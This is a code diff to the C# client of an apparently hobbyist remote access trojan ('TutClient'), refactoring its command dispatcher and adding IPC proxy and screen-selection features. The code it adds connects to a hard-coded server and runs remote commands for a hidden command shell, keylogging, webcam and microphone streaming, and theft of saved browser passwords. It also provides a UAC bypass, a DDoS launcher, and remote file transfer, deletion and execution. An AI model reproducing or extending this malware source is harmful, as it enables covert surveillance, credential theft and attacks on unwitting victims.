@@ -15,11 +15,15 @@ using AForge.Video.DirectShow;
 using System.Data.SQLite;
 using UrlHistoryLibrary;
 using Microsoft.Win32;
+using appCom;
+using System.Drawing;
 
 namespace TutClient
 {
     class Program
     {
+        public static int fps = 100;  //frame rate adjustement
+
         [DllImport("winmm.dll", EntryPoint = "mciSendStringA")]
         public static extern void mciSendStringA(string lpstrCommand,
         string lpstrReturnString, int uReturnLength, int hwndCallback);
@@ -34,7 +38,7 @@ namespace TutClient
         [DllImport("Kernel32")]
         private static extern bool SetConsoleCtrlHandler(EventHandler handler, bool add);
         [DllImport("user32.dll")]
-        static extern void mouse_event(int dwFlags, int dx, int dy, int dwData, int dwExtraInfo); //pinvoke
+        static extern void mouse_event(int dwFlags, int dx, int dy, int dwData, int dwExtraInfo);
 
         private delegate bool EventHandler(CtrlType sig);
         static EventHandler _handler;
@@ -67,15 +71,19 @@ namespace TutClient
             switch (sig)
             {
                 case CtrlType.CTRL_C_EVENT:
+                    StopIPCHandler();
                     sendCommand("dclient");
                     return true;
                 case CtrlType.CTRL_LOGOFF_EVENT:
+                    StopIPCHandler();
                     sendCommand("dclient");
                     return true;
                 case CtrlType.CTRL_SHUTDOWN_EVENT:
+                    StopIPCHandler();
                     sendCommand("dclient");
                     return true;
                 case CtrlType.CTRL_CLOSE_EVENT:
+                    StopIPCHandler();
                     sendCommand("dclient");
                     //Thread.Sleep(1000);
                     return true;
@@ -83,7 +91,8 @@ namespace TutClient
                     return false;
             }
         }
-           [Flags] //mouse movement 
+
+        [Flags]
         public enum MouseEventFlags
         {
             LEFTDOWN = 0x00000002,
@@ -94,13 +103,11 @@ namespace TutClient
             ABSOLUTE = 0x00008000,
             RIGHTDOWN = 0x00000008,
             RIGHTUP = 0x00000010
-
-
         }
 
         private const int SW_HIDE = 0;
         private const int SW_SHOW = 1;
-      
+
         private static Socket _clientSocket = new Socket
             (AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
 
@@ -123,14 +130,73 @@ namespace TutClient
         private static ddos DDoS;
         private static Process cmdProcess;
         private static bool applicationHidden = false;
+        private static Client _ipcClient;
+        private static ProcessData ipcProcess;
+        private static string getScreens; //get screens count
+        public static int ScreenNumber = 0;
 
         static void Main(string[] args)
         {
             if (applicationHidden) ShowWindow(Process.GetCurrentProcess().MainWindowHandle.ToInt32(), SW_HIDE);
             _handler += new EventHandler(Handler);
             SetConsoleCtrlHandler(_handler, true);
+            ServicePointManager.UseNagleAlgorithm = false;
             ConnectToServer();
+            StartIPCHandler();
             RequestLoop();
+        }
+
+        //Stop the IPC handler
+
+        private static void StopIPCHandler()
+        {
+            if (_ipcClient == null) return;
+            _ipcClient.StopPipe();
+            _ipcClient = null;
+        }
+
+        //Start the IPC handler
+
+        private static void StartIPCHandler()
+        {
+            Client ipcClient = new Client();
+            ipcClient.OnMessageReceived += new Client.OnMessageReceivedEventHandler(ReadIPC);
+            _ipcClient = ipcClient;
+        }
+
+        //Launch the child processes you want to communicate with
+
+        private static void LaunchIPCChild(string servername)
+        {
+            string filepath = "";
+            if (servername == "tut_client_proxy")
+            {
+                filepath = @"proxy\proxyServer.exe";
+            }
+
+            ProcessData tempProcess = ProcessData.CheckProcessName("proxyServer", "tut_client_proxy");
+            ipcProcess = tempProcess;
+
+            if ((ipcProcess != null && !ipcProcess.IsPipeOnline("tut_client_proxy")) || ipcProcess == null)
+            {
+                Process p = new Process();
+                p.StartInfo.FileName = filepath;
+                p.StartInfo.Arguments = "use_ipc";
+                p.Start();
+                ipcProcess = new ProcessData(p.Id, "tut_client_proxy");
+                Thread.Sleep(1500);
+            }
+
+            _ipcClient.ConnectPipe("tut_client_proxy", 0);
+        }
+
+        //Read and forward all IPC traffic
+
+        private static void ReadIPC(ClientMessageEventArgs e)
+        {
+            string msg = e.Message;
+            Console.WriteLine("IPC Message: " + msg);
+            sendCommand("ipc§" + "tut_client_proxy" + "§" + msg);
         }
 
         private static string GetIPAddress(string input)
@@ -195,12 +261,16 @@ namespace TutClient
                 {
                     attempts++;
                     Console.WriteLine("Connection attempt " + attempts);
-                    string connectionString = GetIPAddress("192.168.10.57"); //Replace IP with DNS if you want
+                    string connectionString = GetIPAddress("192.168.0.10"); //Replace IP with DNS if you want
                     _clientSocket.Connect(IPAddress.Parse(connectionString), _PORT); //ip is your local ip OR WAN Domain if you going for WAN control
-                    Thread.Sleep(100);
+                    Thread.Sleep(500);
                 }
                 catch (SocketException)
                 {
+                    if (RDesktop.isShutdown == false) // added this as it was still trying to send the screen after disconnection
+                    {
+                        RDesktop.isShutdown = true;
+                    }
                     Console.Clear();
                 }
             }
@@ -233,10 +303,929 @@ namespace TutClient
             RequestLoop();
         }
 
-        private static void reportError(errorType type, String title, String message)
+        public static void reportError(errorType type, String title, String message)
         {
             String data = "error§" + type + "§" + title + "§" + message;
             sendCommand(data);
+        }
+
+        private static String[] GetCommands(string rawData)
+        {
+            List<string> commands = new List<string>();
+            int readBack = 0;
+
+            for (int i = 0; i < rawData.Length; i++)
+            {
+                char current = rawData[i];
+                if (current == '§')
+                {
+                    int dataLength = int.Parse(rawData.Substring(readBack, i - readBack));
+                    string command = rawData.Substring(i + 1, dataLength);
+                    i = i + 1 + dataLength;
+                    readBack = i;
+                    commands.Add(command);
+                }
+            }
+
+            return commands.ToArray();
+        }
+
+        private static void HandleCommand(string text)
+        {
+            if (text == "control.you")
+            {
+                sendCommand("OK! then");
+            }
+
+            if (text.StartsWith("getinfo-"))
+            {
+                int myid = int.Parse(text.Split('-')[1]); //get the client id
+                String allInfo = Environment.MachineName + "|" + GetLocalIPAddress() + "|" + DateTime.Now.ToString() + "|" + AvName();
+                Console.WriteLine(allInfo);
+                String resp = "infoback;" + myid.ToString() + ";" + allInfo;
+                sendCommand(resp);
+            }
+
+            if (text.StartsWith("msg"))
+            {
+                createMessage(text.Split('|'));
+            }
+
+            if (text == "tskmgr")// i added this to start task manager
+            {
+                Process p = new Process();
+                p.StartInfo.FileName = "Taskmgr.exe";
+                p.StartInfo.CreateNoWindow = true;
+                p.Start();
+            }
+
+            if (text == "fpslow")    //FPS 
+            {
+                fps = 150;
+                Console.WriteLine("FPS now 150");
+            }
+            if (text == "fpsbest")      //FPS 
+            {
+                fps = 80;
+                Console.WriteLine("FPS now 80");
+            }
+            if (text == "fpshigh")      //FPS
+            {
+                fps = 50;
+                Console.WriteLine("FPS now 50");
+            }
+            if (text == "fpsmid")      //FPS 
+            {
+                fps = 100;
+                Console.WriteLine("FPS now 100");
+            }
+
+            if (text.StartsWith("freq-"))
+            {
+                int freq = int.Parse(text.Split('-')[1]);
+                generateFreq(freq, 2); //Duration in seconds
+            }
+
+            if (text.StartsWith("sound-"))
+            {
+                String snd = text.Split('-')[1];
+                System.Media.SystemSound sound = System.Media.SystemSounds.Asterisk;
+
+                switch (snd)
+                {
+                    case "0":
+                        sound = System.Media.SystemSounds.Beep;
+                        break;
+
+                    case "1":
+                        sound = System.Media.SystemSounds.Hand;
+                        break;
+
+                    case "2":
+                        sound = System.Media.SystemSounds.Exclamation;
+                        break;
+
+                    case "3":
+                        sound = System.Media.SystemSounds.Asterisk;
+                        break;
+                }
+
+                sound.Play();
+            }
+
+            if (text.StartsWith("t2s|"))
+            {
+                String txt = text.Split('|')[1];
+                t2s(txt);
+            }
+
+            if (text.StartsWith("cd|"))
+            {
+                String opt = text.Split('|')[1];
+
+                if (opt == "open")
+                {
+                    mciSendStringA("set CDAudio door open", "", 127, 0);
+                }
+                else
+                {
+                    mciSendStringA("set CDAudio door closed", "", 127, 0);
+                }
+            }
+
+            if (text.StartsWith("emt|"))
+            {
+                String action = text.Split('|')[1];
+                String element = text.Split('|')[2];
+
+                switch (element)
+                {
+                    case "task":
+
+                        if (action == "hide")
+                        {
+                            hTaskBar();
+                        }
+                        else
+                        {
+                            sTaskBar();
+                        }
+
+                        break;
+
+                    case "clock":
+
+                        if (action == "hide")
+                        {
+                            hClock();
+                        }
+                        else
+                        {
+                            sClock();
+                        }
+
+                        break;
+
+                    case "tray":
+
+                        if (action == "hide")
+                        {
+                            hTrayIcons();
+                        }
+                        else
+                        {
+                            sTrayIcons();
+                        }
+
+                        break;
+
+                    case "desktop":
+
+                        if (action == "hide")
+                        {
+                            hDesktop();
+                        }
+                        else
+                        {
+                            sDesktop();
+                        }
+
+                        break;
+
+                    case "start":
+
+                        if (action == "hide")
+                        {
+                            hStart();
+                        }
+                        else
+                        {
+                            sStart();
+                        }
+
+                        break;
+                }
+            }
+
+            if (text == "proclist")
+            {
+                Process[] allProcess = Process.GetProcesses();
+                String dataString = "";
+
+                foreach (Process proc in allProcess)
+                {
+                    String name = proc.ProcessName;
+                    String id = proc.Id.ToString();
+                    String responding = proc.Responding.ToString();
+                    String title = proc.MainWindowTitle;
+                    String priority = "N/A";
+                    String path = "N/A";
+
+                    if (title == "") title = "N/A";
+
+                    try
+                    {
+                        priority = proc.PriorityClass.ToString();
+                        path = proc.Modules[0].FileName;
+                    }
+                    catch (Exception e)
+                    {
+                        Console.WriteLine("List error: " + e.Message);
+                    }
+                    try
+                    {
+                        String pdata = "setproc|" + name + "|" + responding + "|" + title + "|" + priority + "|" + path + "|" + id;
+                        dataString += pdata + "\n";
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine("List error: " + ex.Message);
+                    }
+                    //sendCommand(pdata);
+                    //System.Threading.Thread.Sleep(100);
+                }
+
+                sendCommand(dataString);
+            }
+
+            if (text.StartsWith("prockill"))
+            {
+                String id = text.Split('|')[1];
+                try
+                {
+                    Process.GetProcessById(int.Parse(id)).Kill();
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine(e.Message);
+                    reportError(errorType.PROCESS_ACCESS_DENIED, "Can't kill process", "Manager failed to kill process: " + id);
+                }
+            }
+
+            if (text.StartsWith("procstart"))
+            {
+                try
+                {
+                    String file = text.Split('|')[1];
+                String state = text.Split('|')[2];
+
+                Process p = new Process();
+
+                switch (state)
+                {
+                    case "Normal":
+                        p.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
+                        break;
+
+                    case "Hidden":
+                        p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                        break;
+                }
+
+                p.StartInfo.FileName = file;
+                p.Start();
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine(ex.Message);
+                }
+            }
+
+            if (text == "startcmd")
+            {
+                ProcessStartInfo info = new ProcessStartInfo();
+
+                info.FileName = "cmd.exe";
+                info.CreateNoWindow = true;
+                info.UseShellExecute = false;
+                info.RedirectStandardInput = true;
+                info.RedirectStandardOutput = true;
+                info.RedirectStandardError = true;
+
+                Process p = new Process();
+
+                p.StartInfo = info;
+                p.Start();
+                cmdProcess = p;
+                toShell = p.StandardInput;
+                fromShell = p.StandardOutput;
+                error = p.StandardError;
+                toShell.AutoFlush = true;
+
+                Thread shellTherad = new Thread(new ThreadStart(getShellInput));
+                shellTherad.Start();
+            }
+
+            if (text == "stopcmd")
+            {
+                cmdProcess.Kill();
+                toShell.Dispose();
+                toShell = null;
+                fromShell.Dispose();
+                fromShell = null;
+                cmdProcess.Dispose();
+                cmdProcess = null;
+            }
+
+            if (text.StartsWith("cmd§"))
+            {
+                string command = text.Split('§')[1];
+                toShell.WriteLine(command + "\r\n");
+            }
+
+            if (text == "fdrive")
+            {
+                DriveInfo[] drives = DriveInfo.GetDrives();
+
+                String info = "";
+
+                foreach (DriveInfo d in drives)
+                {
+                    if (d.IsReady)
+                    {
+                        info += d.Name + "|" + d.TotalSize + "\n";
+                    }
+                    else
+                    {
+                        info += d.Name + "\n";
+                    }
+                }
+
+                String resp = "fdrivel§" + info;
+                sendCommand(resp);
+            }
+
+            if (text.StartsWith("fdir§"))
+            {
+                String path = text.Split('§')[1];
+                Console.WriteLine(path);
+                bool passed = false;
+                if (path.Length == 3 && path.Contains(":\\"))
+                {
+                    passed = true;
+                }
+                if (!passed && Directory.Exists(path))
+                {
+                    passed = true;
+                }
+                if (!passed)
+                {
+                    reportError(errorType.DIRECTORY_NOT_FOUND, "Directory not found", "Manager can't locate: " + path);
+                    return;
+                }
+                Console.WriteLine("Valid = true");
+                String[] directories = Directory.GetDirectories(path);
+                String[] files = Directory.GetFiles(path);
+                List<String> dir = new List<String>();
+                List<String> file = new List<String>();
+                String fi = "";
+                String di = "";
+
+                foreach (String d in directories)
+                {
+                    String size = "N/A";
+                    String name = d.Replace(path, "");
+                    String crtime = Directory.GetCreationTime(d).ToString();
+                    String pth = d;
+                    String cont = name + "§" + size + "§" + crtime + "§" + pth;
+                    dir.Add(cont);
+                }
+
+                foreach (String f in files)
+                {
+                    String size = new FileInfo(f).Length.ToString();
+                    String name = Path.GetFileName(f);
+                    String crtime = File.GetCreationTime(f).ToString();
+                    String pth = f;
+                    String cont = name + "§" + size + "§" + crtime + "§" + pth;
+                    file.Add(cont);
+                }
+
+                foreach (String c in dir)
+                {
+                    di += c + "\n";
+                }
+
+                foreach (String f in file)
+                {
+                    fi += f + "\n";
+                }
+
+                String final = di + fi;
+                sendCommand("fdirl" + final);
+            }
+
+            if (text.StartsWith("f1§"))
+            {
+                String current = text.Split('§')[1];
+                Console.WriteLine(current);
+
+                if (current.Length == 3 && current.Contains(":\\"))
+                {
+                    sendCommand("f1§drive");
+                }
+                else
+                {
+                    String parent = new DirectoryInfo(current).Parent.FullName;
+                    Console.WriteLine(parent);
+                    sendCommand("f1§" + parent);
+                }
+            }
+
+            if (text.StartsWith("fpaste§"))
+            {
+                String source = text.Split('§')[2];
+                String target = text.Split('§')[1];
+                String mode = text.Split('§')[3];
+                String sourceType = "file";
+                if (!Directory.Exists(target))
+                {
+                    reportError(errorType.DIRECTORY_NOT_FOUND, "Target Directory Not found!", "Paste Target: " + target + " cannot be located by manager");
+                    return;
+                }
+
+                if (Directory.Exists(source)) sourceType = "dir";
+                switch (sourceType)
+                {
+                    case "dir":
+                        if (mode == "1")
+                        {
+                            //Copy Directory
+                            String name = new DirectoryInfo(source).Name;
+                            Directory.CreateDirectory(target + "\\" + name);
+                            DirectoryCopy(source, target + "\\" + name, true);
+                        }
+
+                        if (mode == "2")
+                        {
+                            //Move Directory
+                            String name = new DirectoryInfo(source).Name;
+                            Directory.CreateDirectory(target + "\\" + name);
+                            DirectoryMove(source, target + "\\" + name, true);
+                        }
+                        break;
+
+                    case "file":
+                        if (mode == "1")
+                        {
+                            //Copy File
+                            File.Copy(source, target + "\\" + new FileInfo(source).Name, true);
+                        }
+                        if (mode == "2")
+                        {
+                            //Move File
+                            File.Move(source, target + "\\" + new FileInfo(source).Name);
+                        }
+                        break;
+                }
+            }
+
+            if (text.StartsWith("fexec§"))
+            {
+                String path = text.Split('§')[1];
+                bool valid = false;
+                if (File.Exists(path)) valid = true;
+                if (Directory.Exists(path)) valid = true;
+                if (!valid)
+                {
+                    reportError(errorType.FILE_NOT_FOUND, "Can't execute " + path, "File cannot be located by manager");
+                    return;
+                }
+                Process.Start(path);
+            }
+
+            if (text.StartsWith("fhide§"))
+            {
+                String path = text.Split('§')[1];
+                bool valid = false;
+                if (File.Exists(path)) valid = true;
+                if (Directory.Exists(path)) valid = true;
+                if (!valid)
+                {
+                    reportError(errorType.FILE_AND_DIR_NOT_FOUND, "Cannot hide entry!", "Manager failed to locate " + path);
+                    return;
+                }
+                File.SetAttributes(path, FileAttributes.Hidden);
+            }
+
+            if (text.StartsWith("fshow§"))
+            {
+                String path = text.Split('§')[1];
+                bool valid = false;
+                if (File.Exists(path)) valid = true;
+                if (Directory.Exists(path)) valid = true;
+                if (!valid)
+                {
+                    reportError(errorType.FILE_AND_DIR_NOT_FOUND, "Cannot hide entry!", "Manager failed to locate " + path);
+                    return;
+                }
+                File.SetAttributes(path, FileAttributes.Normal);
+            }
+
+            if (text.StartsWith("fdel§"))
+            {
+                String path = text.Split('§')[1];
+                if (Directory.Exists(path))
+                {
+                    Directory.Delete(path, true);
+                }
+                else if (File.Exists(path))
+                {
+                    File.Delete(path);
+                }
+                else
+                {
+                    reportError(errorType.FILE_AND_DIR_NOT_FOUND, "Cant delete entry!", "Manager failed to locate: " + path);
+                }
+            }
+
+            if (text.StartsWith("frename§"))
+            {
+                String path = text.Split('§')[1];
+                String name = text.Split('§')[2];
+                bool isDir = false;
+                String target = "";
+                if (Directory.Exists(path)) isDir = true;
+                if (isDir)
+                {
+                    target = new DirectoryInfo(path).Parent.FullName + "\\" + name;
+                    Directory.Move(path, target);
+                }
+                else
+                {
+                    if (!File.Exists(path))
+                    {
+                        reportError(errorType.FILE_AND_DIR_NOT_FOUND, "Can't rename entry!", "Manager failed to locate: " + path);
+                        return;
+                    }
+                    target = new FileInfo(path).Directory.FullName + "\\" + name;
+                    File.Move(path, target);
+                }
+            }
+
+            if (text.StartsWith("ffile§"))
+            {
+                String path = text.Split('§')[1];
+                String name = text.Split('§')[2];
+                String fullPath = path + "\\" + name;
+
+                //Overwrite existing
+                if (File.Exists(path)) File.Delete(path);
+
+                using (FileStream fs = File.Create(fullPath))
+                {
+                    Byte[] info = new UTF8Encoding(true).GetBytes("");
+                    // Add some information to the file.
+                    fs.Write(info, 0, info.Length);
+                }
+            }
+            if (text.StartsWith("fndir§"))
+            {
+                String path = text.Split('§')[1];
+                String name = text.Split('§')[2];
+                String fullPath = path + "\\" + name;
+                //Overwrite existing
+                if (Directory.Exists(fullPath)) Directory.Delete(fullPath, true);
+
+                Directory.CreateDirectory(fullPath);
+            }
+            if (text.StartsWith("getfile§"))
+            {
+                String path = text.Split('§')[1];
+                if (!File.Exists(path))
+                {
+                    reportError(errorType.FILE_NOT_FOUND, "Can't open file", "Manager failed to locate: " + path);
+                    return;
+                }
+                String content = File.ReadAllText(path);
+                String back = "backfile§" + content;
+                sendCommand(back);
+            }
+            if (text.StartsWith("putfile§"))
+            {
+                String path = text.Split('§')[1];
+                String content = text.Split('§')[2];
+
+                if (!File.Exists(path))
+                {
+                    reportError(errorType.FILE_NOT_FOUND, "Can't save file!", "Manager failed to locate: " + path);
+                    return;
+                }
+                File.WriteAllText(path, content);
+            }
+            if (text.StartsWith("fup"))
+            {
+                String location = text.Split('§')[1];
+                if (File.Exists(location)) //prev. !File.Exists(location) -> bug
+                {
+                    reportError(errorType.FILE_EXISTS, "Can't upload file!", "Manager detected that this file exists!");
+                    return;
+                }
+                int size = int.Parse(text.Split('§')[2]);
+                fup_location = location;
+                fup_size = size;
+                isFileDownload = true;
+                recvFile = new byte[fup_size];
+                sendCommand("fconfirm");
+            }
+            if (text.StartsWith("fdl§"))
+            {
+                String file = text.Split('§')[1];
+                if (!File.Exists(file))
+                {
+                    reportError(errorType.FILE_NOT_FOUND, "Can't download file!", "Manager is unable to locate: " + file);
+                    return;
+                }
+                String size = new FileInfo(file).Length.ToString();
+                fdl_location = file;
+                sendCommand("finfo§" + size);
+            }
+            if (text == "fconfirm")
+            {
+                Byte[] sendFile = File.ReadAllBytes(fdl_location);
+                sendByte(sendFile);
+            }
+            if (text == "dc")
+            {
+                Thread.Sleep(3000);
+                isDisconnect = true;
+                StopIPCHandler();
+            }
+            if (text == "sklog")
+            {
+                if (!isKlThreadRunning)
+                {
+                    Thread t = new Thread(new ThreadStart(Keylogger.Logger));
+                    t.Start();
+                    isKlThreadRunning = true;
+                }
+                if (isKlThreadRunning && !Keylogger.letRun)
+                {
+                    Keylogger.letRun = true;
+                }
+
+            }
+            if (text == "stklog")
+            {
+                if (isKlThreadRunning && Keylogger.letRun) Keylogger.letRun = false;
+            }
+            if (text == "rklog")
+            {
+                String dump = Keylogger.KeyLog;
+                sendCommand("putklog" + dump);
+            }
+            if (text == "cklog")
+            {
+                Keylogger.LastWindow = "";
+                Keylogger.KeyLog = "";
+            }
+            if (text == "rdstart")
+            {
+                Thread rd = new Thread(new ThreadStart(RDesktop.StreamScreen));
+                RDesktop.isShutdown = false;
+                rd.Start();
+            }
+            if (text == "rdstop")
+            {
+                RDesktop.isShutdown = true;
+            }
+            if (text.StartsWith("rmove-"))
+            {
+                string[] t = text.Split('-');
+                string[] x = t[1].Split(':');
+                Cursor.Position = new System.Drawing.Point(int.Parse(x[0]), int.Parse(x[1]));
+            }
+            if (text.StartsWith("rtype-"))
+            {
+                //Console.WriteLine("received write command");
+                string[] t = text.Split('-');
+                if (t[1] != "rtype")
+                {
+                    SendKeys.SendWait(t[1]);
+
+                    SendKeys.Flush(); //never forget to flush ha!
+                }
+
+            }
+            if (text.StartsWith("rclick-"))
+            {
+                string[] t = text.Split('-');
+                MouseEvent(t[1], t[2]);
+                //Cursor.Position = new System.Drawing.Point(729, 182);
+            }
+            if (text == "alist")
+            {
+                List<NAudio.Wave.WaveInCapabilities> source = new List<NAudio.Wave.WaveInCapabilities>();
+                String send = "";
+
+                for (int i = 0; i < NAudio.Wave.WaveIn.DeviceCount; i++)
+                {
+                    source.Add(NAudio.Wave.WaveIn.GetCapabilities(i));
+                }
+
+                foreach (var src in source)
+                {
+                    send += src.ProductName + "|" + src.Channels.ToString() + "§";
+                }
+
+                send = send.Substring(0, send.Length - 1);
+                send = "alist" + send;
+                sendCommand(send);
+            }
+
+            if (text.StartsWith("astream"))
+            {
+                try
+                {
+                    String devNum = text.Split('§')[1];
+                    int deviceNumber = int.Parse(devNum);
+                    NAudio.Wave.WaveInEvent audioSource = new NAudio.Wave.WaveInEvent();
+                    audioSource.DeviceNumber = deviceNumber;
+                    audioSource.WaveFormat = new NAudio.Wave.WaveFormat(44100, NAudio.Wave.WaveIn.GetCapabilities(deviceNumber).Channels);
+                    audioSource.DataAvailable += new EventHandler<NAudio.Wave.WaveInEventArgs>(sendAudio);
+                    streaming = audioSource;
+                    audioSource.StartRecording();
+                }
+                catch (Exception)
+                {
+                    reportError(errorType.DEVICE_NOT_AVAILABLE, "Can't stream microphone!", "Selected Device is not available!");
+                }
+            }
+            if (text == "astop")
+            {
+                streaming.StopRecording();
+                streaming.Dispose();
+                streaming = null;
+            }
+            if (text == "wlist")
+            {
+                string captureDevices = "";
+                FilterInfoCollection devices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
+                int i = 0;
+
+                foreach (FilterInfo device in devices)
+                {
+                    captureDevices += i.ToString() + "|" + device.Name + "§";
+                    i++;
+                }
+
+                if (captureDevices != "") captureDevices = captureDevices.Substring(0, captureDevices.Length - 1); //remove the split char ('§') from the end
+                sendCommand("wlist" + captureDevices);
+            }
+            if (text.StartsWith("wstream"))
+            {
+                int id = int.Parse(text.Split('§')[1]);
+
+                FilterInfoCollection devices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
+                if (devices.Count == 0)
+                {
+                    reportError(errorType.DEVICE_NOT_AVAILABLE, "Can't stream webcam!", "The selected device is not found!");
+                    return;
+                }
+                int i = 0;
+                FilterInfo dName = new FilterInfo("");
+
+                foreach (FilterInfo device in devices)
+                {
+                    if (i == id)
+                    {
+                        dName = device;
+                    }
+                    i++;
+                }
+
+                Console.WriteLine(dName.Name);
+
+                source = new VideoCaptureDevice(dName.MonikerString);
+                source.NewFrame += new NewFrameEventHandler(source_NewFrame);
+                source.Start();
+            }
+            if (text == "wstop")
+            {
+                source.Stop();
+                source = null;
+            }
+            if (text.StartsWith("ddosr"))
+            {
+                String[] p = text.Split('|');
+                String ip = p[1];
+                String port = p[2];
+                String protocol = p[3];
+                String packetSize = p[4];
+                String threads = p[5];
+                String delay = p[6];
+
+                DDoS = new ddos(ip, port, protocol, packetSize, threads, delay);
+                DDoS.startDdos();
+            }
+
+            if (text.StartsWith("ddosk"))
+            {
+                DDoS.stopDdos();
+            }
+
+            if (text == "getpw")
+            {
+                bool validOperation = true;
+                String app = Application.StartupPath;
+                if (!File.Exists(app + "\\ff.exe"))
+                {
+                    validOperation = false;
+                }
+
+                if (validOperation)
+                {
+                    passwordManager pm = new passwordManager();
+                    String[] passwd = pm.getSavedPassword();
+                    String gcpw = "gcpw\n" + passwd[0];
+                    String iepw = "iepw\n" + passwd[1];
+                    String ffpw = "ffpw\n" + passwd[2];
+                    sendCommand(iepw);
+                    Console.WriteLine("iepw sent");
+                    Thread.Sleep(1000);
+                    sendCommand(gcpw);
+                    Console.WriteLine("gcpw sent");
+                    Thread.Sleep(1000);
+                    sendCommand(ffpw);
+                    Console.WriteLine("ffpw sent");
+                    pm = null;
+                    gcpw = null;
+                    iepw = null;
+                    ffpw = null;
+                    return;
+                }
+                else
+                {
+                    sendCommand("getpwu");
+                    reportError(errorType.PASSWORD_RECOVERY_FAILED, "Can't recover passwords!", "ff.exe (PasswordFox) is missing!");
+                    /*if (isgetpwu) return;
+                    sendCommand("getpwu");
+                    isgetpwu = true;
+                    WebClient wc = new WebClient();
+                    wc.DownloadFile("http://www.nirsoft.net/toolsdownload/passwordfox.zip", app + "\\ffcp.zip");
+                    System.IO.Compression.ZipFile.ExtractToDirectory(app + "\\ffcp.zip", app + "\\ffex");
+                    System.IO.File.Copy(app + "\\ffex\\PasswordFox.exe", app + "\\ff.exe");
+                    System.IO.Directory.Delete(app + "\\ffex");
+                    System.IO.File.Delete(app + "\\ffcp.zip");
+                    isgetpwu = false;*/
+                }
+            }
+
+            if (text == "getstart")
+            {
+                String app = Application.StartupPath;
+                sendCommand("setstart§" + app);
+            }
+
+            if (text == "uacbypass")
+            {
+                UAC uac = new UAC();
+                if (uac.IsAdmin())
+                {
+                    sendCommand("uac§a_admin");
+                    return;
+                }
+
+                bool success = uac.BypassUAC();
+                if (success) sendCommand("uac§s_admin");
+            }
+
+            if (text.StartsWith("writeipc§"))
+            {
+                string idAndMessage = text.Substring(text.IndexOf('§') + 1);
+                string message = idAndMessage.Substring(idAndMessage.IndexOf('§') + 1);
+                _ipcClient.WriteStream(message);
+            }
+
+            if (text.StartsWith("startipc§"))
+            {
+                string servername = text.Substring(text.IndexOf('§') + 1);
+                StartIPCHandler();
+                LaunchIPCChild(servername);
+            }
+
+            if (text.StartsWith("stopipc§"))
+            {
+                StopIPCHandler();
+            }
+
+            if (text == "countScreens")//-----------------added this to count the screens and send response to server
+            {
+
+                foreach (var screen in Screen.AllScreens)
+                {
+                    getScreens = screen.DeviceName.Replace("\\\\.\\DISPLAY", "");
+
+                    sendCommand("ScreenCount" + getScreens);
+                }
+            }
+
+            if (text.StartsWith("screenNum"))//----------this will set the screen else is equal to screen 0
+            {
+                int screenNumbers = int.Parse(text.Replace("screenNum", "")) - 1; //because the screens start at 0 not 1 
+                ScreenNumber = screenNumbers;
+                Console.WriteLine(ScreenNumber.ToString());
+            }
         }
 
         //ReceiveResponse
@@ -245,893 +1234,96 @@ namespace TutClient
         {
 
             var buffer = new byte[2048];
-            
-            try //added a try catch ,if the server shutdown or disconnected rapidly this would crash
+
+            try
             {
-                
-            int received = _clientSocket.Receive(buffer, SocketFlags.None);
-            if (received == 0) return;
-            var data = new byte[received];
-            Array.Copy(buffer, data, received);
+                int received = _clientSocket.Receive(buffer, SocketFlags.None);
+                if (received == 0) return;
+                var data = new byte[received];
+                Array.Copy(buffer, data, received);
 
-            if (isFileDownload)
-            {
-                Buffer.BlockCopy(data, 0, recvFile, writeSize, data.Length);
-
-                writeSize += data.Length;
-
-                if (recvFile.Length == fup_size)
+                if (isFileDownload)
                 {
-                    Console.WriteLine("Create File " + recvFile.Length);
+                    Buffer.BlockCopy(data, 0, recvFile, writeSize, data.Length);
 
-                    using (FileStream fs = File.Create(fup_location))
+                    writeSize += data.Length;
+
+                    if (writeSize == fup_size) //prev. recvFile.Length == fup_size
                     {
-                        Byte[] info = recvFile;
-                        // Add some information to the file.
-                        fs.Write(info, 0, info.Length);
-                    }
+                        Console.WriteLine("Create File " + recvFile.Length);
 
-                    Array.Clear(recvFile, 0, recvFile.Length);
-                    sendCommand("frecv");
-                    isFileDownload = false;
+                        using (FileStream fs = File.Create(fup_location))
+                        {
+                            Byte[] info = recvFile;
+                            // Add some information to the file.
+                            fs.Write(info, 0, info.Length);
+                        }
+
+                        Array.Clear(recvFile, 0, recvFile.Length);
+                        sendCommand("frecv");
+                        writeSize = 0;
+                        isFileDownload = false;
+                        return;
+                    }
+                }
+
+                if (!isFileDownload)
+                {
+                    string text = Encoding.Unicode.GetString(data); //unicode
+                    string[] commands = GetCommands(text);
+                    //text = Decrypt(text); //edit
+
+                    Console.WriteLine(text);
+
+                    foreach (string cmd in commands)
+                    {
+                        HandleCommand(Decrypt(cmd));
+                    }
                 }
             }
-
-            if (!isFileDownload)
+            catch (Exception ex)
             {
-                string text = Encoding.Unicode.GetString(data); //unicode
-                text = Decrypt(text); //edit
-
-                Console.WriteLine(text);
-
-                if (text == "control.you")
-                {
-                    sendCommand("OK! then");
-                }
-
-                if (text.StartsWith("getinfo-"))
-                {
-                    int myid = int.Parse(text.Split('-')[1]); //get the client id
-                    String allInfo = Environment.MachineName + "|" + GetLocalIPAddress() + "|" + DateTime.Now.ToString() + "|" + AvName();
-                    Console.WriteLine(allInfo);
-                    String resp = "infoback;" + myid.ToString() + ";" + allInfo;
-                    sendCommand(resp);
-                }
-
-                if (text.StartsWith("msg"))
-                {
-                    createMessage(text.Split('|'));
-                }
-
-                if (text.StartsWith("freq-"))
-                {
-                    int freq = int.Parse(text.Split('-')[1]);
-                    generateFreq(freq, 2); //Duration in seconds
-                }
-
-                if (text.StartsWith("sound-"))
-                {
-                    String snd = text.Split('-')[1];
-                    System.Media.SystemSound sound = System.Media.SystemSounds.Asterisk;
-
-                    switch (snd)
-                    {
-                        case "0":
-                            sound = System.Media.SystemSounds.Beep;
-                            break;
-
-                        case "1":
-                            sound = System.Media.SystemSounds.Hand;
-                            break;
-
-                        case "2":
-                            sound = System.Media.SystemSounds.Exclamation;
-                            break;
-
-                        case "3":
-                            sound = System.Media.SystemSounds.Asterisk;
-                            break;
-                    }
-
-                    sound.Play();
-                }
-
